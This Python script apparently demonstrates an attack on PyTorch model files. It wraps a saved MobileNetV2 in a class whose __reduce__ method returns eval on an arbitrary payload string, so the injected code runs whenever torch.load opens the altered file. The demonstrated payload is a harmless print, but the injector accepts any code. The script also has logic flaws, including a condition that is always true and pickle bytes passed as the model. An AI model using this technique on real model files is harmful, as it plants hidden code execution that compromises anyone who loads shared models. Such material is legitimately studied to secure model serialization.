import torch
import zipfile
import io
from fickling.fickle import Pickled
import pickle 
from pathlib import Path
import shutil
from tempfile import TemporaryDirectory
from typing import Optional
import warnings

# Create a PyTorch Model class that uses the original model as a pretrained module 
# and injects the payload by overriding the reduce method.
# This class is used for the fallback injection method. 
class BaseInjection(torch.nn.Module):
    def __init__(self, original_model: torch.nn.Module, payload: str):
        super().__init__()
        self.original_model = original_model
        self.payload = payload
    
    def forward(self, *args, **kwargs):
        return self.original_model(*args, **kwargs)
    
    def __reduce__(self):
        return eval, (self.payload,)


class PyTorchModelWrapper:
    def __init__(self, path: Path):
        self.path: Path = path
        self._pickled: Optional[Pickled] = None
    
    @property
    def pickled(self) -> Pickled:
        if self._pickled is None:
            # Open the zip archive
            with zipfile.ZipFile(self.path, 'r') as zip_ref:
                # Find the path to data.pkl within the zip archive
                data_pkl_path = next((name for name in zip_ref.namelist() if name.endswith('/data.pkl')), None)
                if data_pkl_path is None:
                    raise ValueError("data.pkl not found in the zip archive")
                # Read the data.pkl file directly using the determined path
                with zip_ref.open(data_pkl_path, "r") as pickle_file:
                    self._pickled = Pickled.load(pickle_file)
        return self._pickled
    
    def inject_payload(self, payload: str, output_path: Path, injection: str = "all") -> None:
        # Fallback injection method
        if "fallback" or "all":
            injected_model = BaseInjection(self.pickled.dumps(), payload)
            torch.save(injected_model, output_path)


# Uncomment these lines if you no longer have a 'mobilenet_v2.pt' file
import torchvision.models as models
model = models.mobilenet_v2()
torch.save(model, 'mobilenet_v2.pt')

deserialized_model = torch.load('mobilenet_v2.pt')
file_path = 'path/to/pytorch/model.pth'
wrapper = PyTorchModelWrapper('mobilenet_v2.pt')
payload = '''print("Hello, World!")'''
wrapper.inject_payload(payload, 'altered_model.pt')
torch.load('altered_model.pt')